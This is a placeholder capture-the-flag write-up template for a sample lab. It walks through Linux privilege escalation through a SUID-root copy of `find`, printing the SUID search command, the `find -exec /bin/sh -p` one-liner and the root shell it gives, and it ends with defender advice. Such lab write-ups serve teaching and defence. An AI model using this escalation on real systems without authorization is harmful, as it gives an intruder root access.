# Example: SUID Privilege Escalation (Linux, 100 pts): Sample Lab 2026

> **This is a placeholder writeup** that shows how the template renders on the site. Replace it with a real one.

| Field      | Value |
|------------|-------|
| Event      | Sample Lab, 2026-11-01 |
| Category   | linux |
| Points     | 100 (static) |
| Solves     | n/a |
| Author     | n/a |
| Solved by  | your-handle |
| Status     | Solved during event |

## TL;DR
A SUID-root copy of `find` was left on the box. `find -exec` runs commands with the file owner's privileges, which gives a root shell.

## Challenge
> You have a low-privileged shell on the target. Read `/root/flag.txt`.

- Service: `ssh user@target.example.lab` (lab infrastructure, now offline)

## First look
I started with the standard privilege-escalation checks: sudo rights, SUID binaries, cron jobs and writable paths.

```bash
$ sudo -l
Sorry, user user may not run sudo on target.

$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/find
/usr/bin/mount
```

`/usr/bin/find` stands out. It is not SUID on a default install.

## Dead ends
- Kernel exploit: `uname -r` showed a patched kernel -> no public exploit applied.
- Cron jobs: `/etc/crontab` had only default entries -> nothing writable by my user.

## Solution
### Step 1: Confirm the binary runs as root
SUID means the process runs with the owner's effective UID. I checked the owner first.

```bash
$ ls -l /usr/bin/find
-rwsr-xr-x 1 root root 224848 Jan  9  2026 /usr/bin/find
```

### Step 2: Use `-exec` to spawn a privileged shell
GTFOBins documents that `find` can execute arbitrary commands. The `-p` flag stops the shell from dropping privileges.

```bash
$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
# cat /root/flag.txt
```

## Flag
`CTF{example_flag}`

## Lessons learned
- Run the SUID search early. It takes seconds and often gives the answer.
- Compare the SUID list against a clean install to spot outliers quickly.
- Defender view: audit SUID binaries regularly and mount user-writable filesystems with `nosuid`.

## References
- [GTFOBins: find](https://gtfobins.github.io/gtfobins/find/)
- [MITRE ATT&CK T1548.001: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)
